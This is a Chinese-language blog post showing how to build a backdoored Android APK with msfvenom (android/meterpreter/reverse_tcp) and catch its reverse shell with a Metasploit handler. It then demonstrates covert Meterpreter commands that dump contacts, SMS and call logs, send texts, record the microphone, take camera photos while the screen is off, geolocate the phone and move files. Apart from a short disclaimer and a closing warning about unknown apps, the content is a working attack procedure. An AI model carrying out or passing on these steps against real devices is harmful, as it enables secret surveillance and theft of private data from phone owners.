---
layout: post
title: msf渗透android并植入后门
date: 2016-12-19 15:32:08
comments: true
tags:
	- 安卓
	- 安全攻防
---
## 前言
><font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>

## 正文
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 <!--more-->。团队合作，在Metasploit和综合报告提出了他们的发现。

### 环境
> * BackBox、kali linux、或者BackTrack(kali linux的前身)
> * 一台安卓设备


> 环境不说太多介绍了，直接来实战。
### 生成payload
> 装好环境后查看自己的ip
![](/images/pasted-10.png)

> 生成一个payload
>	
	msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R > /root/apk.apk
>* p 设置要使用的payload
>* LHOST 设置用来接收反弹连接的主机
>* LPORT 设置用来接收反弹连接的端口

![](/images/pasted-11.png)

>很小，才8kb
>如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。
>生成的apk放到手机上安装，安装完成后是这样的。
>![](/images/pasted-12.png)

### 反弹shell
>启动msf
>![](/images/pasted-13.png)
>依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致)
	* use exploit/multi/handler
	* set payload android/meterpreter/reverse_tcp
	* set LHOST 192.168.0.18 
	* set LPORT 2333
>![](/images/pasted-14.png)
> 设置完毕后就可以输入 `exploit` 来执行攻击了
>![](/images/pasted-15.png)

>可以看到msf会一直在监听本机的2333端口，等待着目标连接上线
>然后我打开我们刚刚安装的
>打开后会连接到msf
>![](/images/pasted-16.png)
>![](/images/pasted-17.png)
>这样我们就拿到了手机的shell

### 控制指令
>我来介绍几个有意思的指令。
	* check_root	#查看是否root
	* dump_calllog	#下载通讯记录
	* dump_contacts	#下载联系人
	* dump_sms		#下载短信
	* send_sms		#发送短信
	* record_mic	#录音
	* webcam_list	#查看手机摄像头
	* webcam_snap	#拍照
	* webcam_stream	#连续拍照
	* geolocate		#获取目标地理位置
	* upload		#上传文件到手机
	* download		#下载手机上的文件
	* shell			#进入手机的bash shell

##### check_root(检测root)
>![](/images/pasted-18.png)
>是root的设备

##### dump_contacts(下载联系人)
>![](/images/pasted-19.png)
>57个联系人
>![](/images/pasted-20.png)

##### dump_sms(下载短信)
>![](/images/pasted-21.png)
>1271条短信
>![](/images/pasted-22.png)

##### send_sms(发送短信)
> * -d目标电话号码
> * -t 短信内容
>![](/images/pasted-23.png)
>![](/images/pasted-24.png)

##### record_mic(录音)
> * -d 录音的秒数
> 音频文件会自动保存在/var/www/html/目录下
>![](/images/pasted-25.png)

##### webcam_list(检测摄像头)
>![](/images/pasted-26.png)
>2:前置摄像头
>1:后置摄像头

##### webcam_snap(拍照)
> * -i 选择使用哪个摄像头拍照
>手机息屏的时候也可以拍照
>![](/images/pasted-27.png)

##### webcam_stream(连续拍照)
> * -i 指定摄像头
> * -d 拍照间隔(默认1800毫秒)
> 使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片
>![](/images/pasted-28.png)

##### geolocate(获取地理位置)
>![](/images/pasted-29.png)

##### upload(上传文件到手机)
>![](/images/pasted-30.png)

##### download(下载文件到手机)
>![](/images/pasted-31.png)

##### shell(进入手机bash shell)
>![](/images/pasted-32.png)

### 最后
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。